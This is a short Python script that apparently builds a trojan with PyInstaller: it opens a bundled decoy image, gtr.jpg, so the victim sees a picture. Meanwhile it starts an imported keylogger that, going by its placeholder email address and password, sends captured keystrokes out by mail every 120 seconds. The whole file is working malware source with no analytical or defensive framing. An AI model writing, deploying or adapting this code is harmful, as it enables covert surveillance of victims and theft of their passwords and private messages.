import keylogger
import sys
import subprocess

file_name = sys._MEIPASS + "\gtr.jpg"           # Default location of the front file (is appdata) put by pyinstaller 
subprocess.Popen(file_name, shell = True)
my_keylogger = keylogger.Keylogger(120, "MAILID", "PASSWORD")
my_keylogger.start()
